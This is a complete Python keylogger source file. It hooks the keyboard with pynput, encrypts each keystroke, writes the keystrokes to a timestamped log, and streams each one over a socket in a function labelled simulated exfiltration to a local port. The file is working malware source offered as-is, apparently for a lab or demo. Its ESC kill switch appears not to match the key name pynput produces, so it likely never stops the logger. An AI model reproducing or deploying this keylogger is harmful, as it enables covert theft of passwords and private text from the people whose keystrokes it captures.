# keylogger.py
from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
import socket
import base64
import os

# Load encryption key
with open("secret.key", "rb") as key_file:
    key = key_file.read()
fernet = Fernet(key)

# File to store encrypted logs
log_file = "keylog_encrypted.log"

# Kill switch key
KILL_KEY = "ESC"

def encrypt_data(data):
    encoded_data = base64.b64encode(data.encode())
    encrypted_data = fernet.encrypt(encoded_data)
    return encrypted_data

def write_encrypted_log(encrypted):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(log_file, "ab") as f:
        f.write(f"[{timestamp}] ".encode() + encrypted + b"\n")

def on_press(key):
    try:
        key_data = key.char
    except AttributeError:
        key_data = str(key)

    # Kill switch
    if key_data == KILL_KEY:
        return False

    encrypted = encrypt_data(key_data)
    write_encrypted_log(encrypted)
    simulate_exfiltration(encrypted)

def simulate_exfiltration(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(("127.0.0.1", 9001))
            s.sendall(data)
    except:
        pass  # Server might not be running

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
